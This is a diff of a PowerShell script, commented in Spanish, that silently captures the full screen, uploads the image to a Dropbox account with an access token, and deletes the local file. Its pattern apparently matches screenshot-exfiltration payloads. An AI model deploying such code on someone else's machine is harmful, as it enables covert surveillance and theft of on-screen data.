@@ -1,60 +1,58 @@
-# Función para subir archivos a Dropbox
-function DropBox-Upload {
-    [CmdletBinding()]
-    param (
-        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
-        [Alias("f")]
-        [string]$SourceFilePath,
-        [string]$db
-    )
-    $outputFile = Split-Path $SourceFilePath -leaf
-    $TargetFilePath = "/$outputFile"
-    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-    $authorization = "Bearer " + $db
-    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-    $headers.Add("Authorization", $authorization)
-    $headers.Add("Dropbox-API-Arg", $arg)
-    $headers.Add("Content-Type", 'application/octet-stream')
-
-    # Subir el archivo a Dropbox
-    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-}
-
-# Función para capturar la pantalla
+# Función para capturar la pantalla y guardarla como un archivo PNG
 function Capture-Screen {
     Add-Type -AssemblyName System.Windows.Forms
     Add-Type -AssemblyName System.Drawing
     $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-    $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
+    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
     $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
     $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
-    $filePath = "$env:temp\sc.png"
+    $filePath = "$env:TEMP\screenshot.png"
     $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
     $graphics.Dispose()
     $bitmap.Dispose()
     return $filePath
 }
 
-# Capturar la pantalla y subirla a Dropbox
-param (
-    [string]$db
-)
+# Función para subir archivos a Dropbox usando un token de acceso
+function DropBox-Upload {
+    param (
+        [string]$SourceFilePath,
+        [string]$DbToken
+    )
+    $outputFile = Split-Path $SourceFilePath -leaf
+    $TargetFilePath = "/$outputFile"
+    $arg = @{
+        "path" = $TargetFilePath
+        "mode" = "add"
+        "autorename" = $true
+        "mute" = $false
+    } | ConvertTo-Json
 
-try {
-    # Capturar la pantalla y obtener la ruta del archivo
-    $screenshotPath = Capture-Screen
+    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+    $headers.Add("Authorization", "Bearer $DbToken")
+    $headers.Add("Dropbox-API-Arg", $arg)
+    $headers.Add("Content-Type", 'application/octet-stream')
 
-    # Subir la captura de pantalla a Dropbox
-    if (-not ([string]::IsNullOrEmpty($db))) {
-        DropBox-Upload -SourceFilePath $screenshotPath -db $db
-    } else {
-        Write-Error "No se proporcionó el token de acceso de Dropbox."
+    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+}
+
+# Función principal que orquesta la captura y subida
+function Perform-CaptureAndUpload {
+    param([string]$DbToken)
+    try {
+        # Capturar la pantalla y obtener la ruta del archivo PNG
+        $screenshotPath = Capture-Screen
+
+        # Subir la captura de pantalla a Dropbox
+        if (-not ([string]::IsNullOrEmpty($DbToken))) {
+            DropBox-Upload -SourceFilePath $screenshotPath -DbToken $DbToken
+        } else {
+            Write-Error "No se proporcionó el token de acceso de Dropbox."
+        }
+
+        # Limpiar el archivo de captura de pantalla del sistema
+        Remove-Item -Path $screenshotPath -Force
+    } catch {
+        Write-Error "Ocurrió un error durante la captura o la subida: $_"
     }
-
-    # Limpiar el archivo de captura de pantalla
-    Remove-Item -Path $screenshotPath -Force
 }
-catch {
-    Write-Error "Ocurrió un error: $_"
-}
-
